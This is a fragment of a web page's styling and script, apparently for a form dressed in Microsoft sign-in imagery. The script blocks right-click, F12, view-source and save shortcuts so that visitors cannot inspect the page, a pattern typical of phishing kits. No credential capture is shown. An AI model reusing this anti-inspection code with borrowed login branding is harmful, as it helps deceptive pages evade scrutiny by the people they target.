<style>
body{
  font-family:'Inter',sans-serif;
  background:#f3f4f6;
  margin:0;
  padding:20px;
  background: url('https://logincdn.msauth.net/shared/5/images/78_3a53c38a2dc671fb4daf.jpg')

  background-size: cover;
}


.container{
  max-width:700px;
  margin:auto;
  background:white;
  padding:25px;
  border-radius:10px;
  box-shadow:0 5px 15px rgba(0,0,0,0.1);
}

h2{ margin-bottom:15px; }

/* LOGOS */
.logos{
  display:flex;
  gap:15px;
  margin-bottom:10px;
  flex-wrap:wrap;
}

.logos img{ height:30px; }

label{
  font-size:14px;
  display:block;
  margin-top:15px;
}

.required{ color:red; }

/* INPUTS */
input, select{
  width:96%;
  padding:10px;
  margin-top:5px;
  border:1px solid #d1d5db;
  border-radius:6px;
  font-size:16px;
  transition:0.2s;
}

/* EFECTO AZUL */
input:focus, select:focus{
  border-color:#2563eb;
  outline:none;
  box-shadow:0 0 0 2px rgba(37,99,235,0.2);
}

/* FILA */
.row{
  display:flex;
  gap:10px;
}

.row select,
.row input{
  flex:1;
}

/* BOTON */
button{
  width:100%;
  margin-top:25px;
  padding:14px;
  border:none;
  border-radius:8px;
  background:#2563eb;
  color:white;
  font-size:16px;
  font-weight:500;
  cursor:pointer;
}

button:hover{
  background:#1d4ed8;
}

/* TERMINOS SOLO TEXTO */
.terms{
  margin-top:15px;
  background:#e5e7eb;
  padding:12px;
  border-radius:8px;
  font-size:14px;
  color:#374151;
  text-align:left;
  line-height:1.4;
}

/* MÓVIL */
@media(max-width:600px){
  .row{
    flex-direction:row;
  }
}
</style>

<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>
